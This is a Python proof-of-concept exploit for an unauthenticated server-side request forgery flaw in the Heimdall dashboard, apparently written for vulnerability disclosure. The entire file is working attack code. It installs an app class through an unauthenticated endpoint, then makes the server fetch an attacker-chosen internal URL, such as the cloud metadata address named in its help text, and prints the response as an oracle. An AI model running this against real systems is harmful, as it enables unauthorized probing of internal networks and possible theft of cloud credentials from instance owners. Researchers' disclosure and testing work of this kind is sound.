#!/usr/bin/env python3
"""
PoC: Unauthenticated SSRF in Heimdall via the test_config / livestats path (incomplete SafeUrlFetcher fix).
CWE-918 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High)
Researcher: Kashish Topiwala
Affected: POST /test_config -> SupportedApps::execute() (raw Guzzle, no SSRF guard)

AUTHORIZED TESTING ONLY. Run only against a Heimdall instance you own.

Heimdall added a SafeUrlFetcher SSRF guard only to ItemController; the enhanced-app test/livestats
requests use SupportedApps::execute(), a raw Guzzle client with no validation. On a default
(passwordless) install these endpoints are unauthenticated and CSRF-exempt.
"""
import argparse, urllib.request, urllib.parse

def post(url, fields):
    data = urllib.parse.urlencode(fields).encode()
    r = urllib.request.Request(url, data=data, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    resp = urllib.request.urlopen(r, timeout=30)
    return resp.status, resp.read().decode("utf-8", "replace")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:8081")
    ap.add_argument("--target", required=True, help="internal URL to make the server fetch, e.g. http://169.254.169.254/")
    ap.add_argument("--appid", default="140902edbcc424c09736af28ab2de604c3bde936", help="enhanced app id (default AdGuard Home)")
    a = ap.parse_args(); B = a.url.rstrip("/")
    print("[*] Step 1: POST /appload (unauth) install enhanced app class")
    st, _ = post(f"{B}/appload", {"app": a.appid}); print("    ->", st)
    print("[*] Step 2: POST /test_config (unauth) -> server fetches target")
    st, body = post(f"{B}/test_config", {"data[type]": a.appid, "data[url]": a.target,
                                         "data[username]": "poc", "data[password]": "poc"})
    print("    ->", st)
    print("    oracle:", body.strip()[:200])
    print("\n[INFO] The oracle varies by the internal target's status; server logs show the request originated from Heimdall.")

if __name__ == "__main__":
    main()
